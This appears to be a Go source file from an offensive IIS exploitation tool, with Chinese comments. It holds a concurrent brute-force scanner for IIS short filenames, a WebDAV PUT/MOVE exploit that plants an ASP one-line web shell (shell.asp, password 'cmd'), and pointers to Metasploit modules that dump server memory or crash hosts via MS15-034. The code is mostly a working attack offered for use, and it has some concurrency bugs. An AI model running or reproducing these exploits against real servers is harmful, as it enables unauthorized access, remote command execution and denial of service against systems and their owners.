package main

import (
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"sync"
)

// 扫描IIS短文件名漏洞
func ExpShortFileNameVal(target string) {
	// 存放所有存在的文件
	var allsfn []string
	// 存放每个模块输出的总文件名
	var tempsfn []string
	// 获取前6个
	// 存放临时文件
	tmp := []string{""}

	// 获取第一个短文件前面的6个字符，由于要猜解6个字符，需要循环6次
	for i := 0; i < 6; i++ {
		// 将tmp赋值给temp
		temp := tmp
		// 置空tmp，获取新一轮的短文件
		tmp = []string{}

		// 循环输出上一轮合格的文件
		for _, sfn := range temp {
			wg := &sync.WaitGroup{}
			m := &sync.Mutex{}
			// 根据合规字符循环
			for _, v := range TraverseChar {
				wg.Add(1)
				go func(val rune) {
					defer wg.Done()
					resp, err := getRequest(target, sfn+string(val)+"*~1*/a.aspx", nil)
					if err != nil {
						fmt.Println(ERR, err)
						return
					}
					// 判断文件夹是否合格
					if resp.StatusCode == 404 {
						// 返回搜索结果
						fmt.Println(WARNING, sfn+string(val)+"~1")
						// 存放最后一轮的检测合格的文件名
						m.Lock() // 加锁
						tmp = append(tmp, sfn+string(val))
						m.Unlock() // 解锁
						resptemp, err := getRequest(target, sfn+string(val)+"~1*/a.aspx", nil)
						if err != nil {
							fmt.Println(ERR, err)
							return
						}
						// 判断符合真正短文件规则的文件名
						if resptemp.StatusCode == 404 {
							// 存放所有合格的文件名
							tempsfn = append(tempsfn, sfn+string(val))
						}
					}
				}(v)

			}
			wg.Wait()
		}

	}
	// 获取多余，由于多余的~x，最多只有4个，所以循环4次
	// 将全部检测处理的文件存放到tmp中
	tmp = tempsfn
	// 置空获取，用于获取最新检测到的文件
	tempsfn = []string{}
	// 猜测有没有多余的短文件名，最多四个
	for i := 1; i < 5; i++ {
		wg := &sync.WaitGroup{}
		m := &sync.Mutex{}
		for _, v := range tmp {
			wg.Add(1)
			func(val string) {
				resp, err := getRequest(target, val+"~"+strconv.Itoa(i)+"*/a.aspx", nil)
				if err != nil {
					fmt.Println(ERR, err)
					return
				}
				// 判断符合真正短文件规则的文件名
				if resp.StatusCode == 404 {
					resptemp, err := getRequest(target, val+"*~"+strconv.Itoa(i)+"/a.aspx", nil)
					if err != nil {
						fmt.Println(ERR, err)
						return
					}
					// 判定该名字是否没有后缀名，如果没有那就放到
					// 文件名虽然没有后缀，但是我们没有足够的证据判定该文件名为文件夹
					if resptemp.StatusCode == 404 {
						m.Lock() // 加锁
						allsfn = append(allsfn, target+val+"~"+strconv.Itoa(i))
						m.Unlock() // 解锁
					}
					// 存放最后一轮的检测合格的文件名
					tempsfn = append(tempsfn, val+"*~"+strconv.Itoa(i)+".")
				}
			}(v)

		}
		wg.Done()
	}

	// 获取后缀，由于要猜解后三位，需要循环3次
	tmp = tempsfn
	for i := 0; i < 3; i++ {
		// 将tmp赋值给temp
		temp := tmp
		// 置空tmp，获取新一轮的短文件
		tmp = []string{}
		// 循环输出上一轮合格的文件
		for _, sfn := range temp {
			// 根据合规字符循环
			for _, val := range TraverseChar {
				resp, err := getRequest(target, sfn+string(val)+"*/a.aspx", nil)
				if err != nil {
					fmt.Println(ERR, err)
					return
				}
				// 判断文件夹是否合格
				if resp.StatusCode == 404 {
					// 返回搜索结果
					fmt.Println(WARNING, sfn+string(val))
					// 存放最后一轮的检测合格的文件名
					tmp = append(tmp, sfn+string(val))
					resptemp, err := getRequest(target, sfn+string(val)+"/a.aspx", nil)
					if err != nil {
						fmt.Println(ERR, err)
						return
					}
					// 判断符合真正短文件规则的文件名
					if resptemp.StatusCode == 404 {
						// 存放所有合格的文件名
						allsfn = append(allsfn, target+strings.Replace(sfn, "*", "", -1)+string(val))
					}
				}
			}
		}
	}
	// 汇总
	fmt.Println(RIGHT, "这个", target, "服务器存在IIS短文件漏洞，结果：")
	for _, val := range allsfn {
		fmt.Printf(" - %s\n", val)
	}
}

// 使用PUT漏洞
func ExpPut(target string) {
	// 构造PUT的payload，内容为success
	requ, err := http.NewRequest("PUT", target+"shell.txt", strings.NewReader(`<%execute(request("cmd"))%>`))
	if err != nil {
		fmt.Println(ERR, err)
		return
	}
	// 设置请求头
	requ.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586")
	// 请求
	resp, err := http.DefaultClient.Do(requ)
	if err != nil {
		fmt.Println(ERR, err)
		return
	}
	defer resp.Body.Close()
	// 使用MOVE请求方式修改
	requ, err = http.NewRequest("MOVE", target+"shell.txt", nil)
	if err != nil {
		fmt.Println(ERR, err)
		return
	}
	// 设置请求头
	requ.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586")
	requ.Header.Add("Destination", target+"shell.asp")
	// 请求
	resp, err = http.DefaultClient.Do(requ)
	if err != nil {
		fmt.Println(ERR, err)
		return
	}
	// 判断状态码和请求头
	if resp.StatusCode != 207 && resp.StatusCode != 401 {
		fmt.Println(ERR, "getshell 失败")
		return
	}
	fmt.Println(RIGHT, "shell的URL：", target+"shell.asp", "，密码是：cmd")
}

// HTTP.SYS远程代码执行漏洞
func ExpMs15_034(target string) {
	fmt.Println(RIGHT, "如果需要获取内存，请使用MSF的auxiliary/scanner/http/ms15_034_http_sys_memory_dump模块")
	fmt.Println(RIGHT, "如果需要将服务器打成蓝屏，请使用MSF的auxiliary/dos/http/ms15_034_ulonglongadd")
}
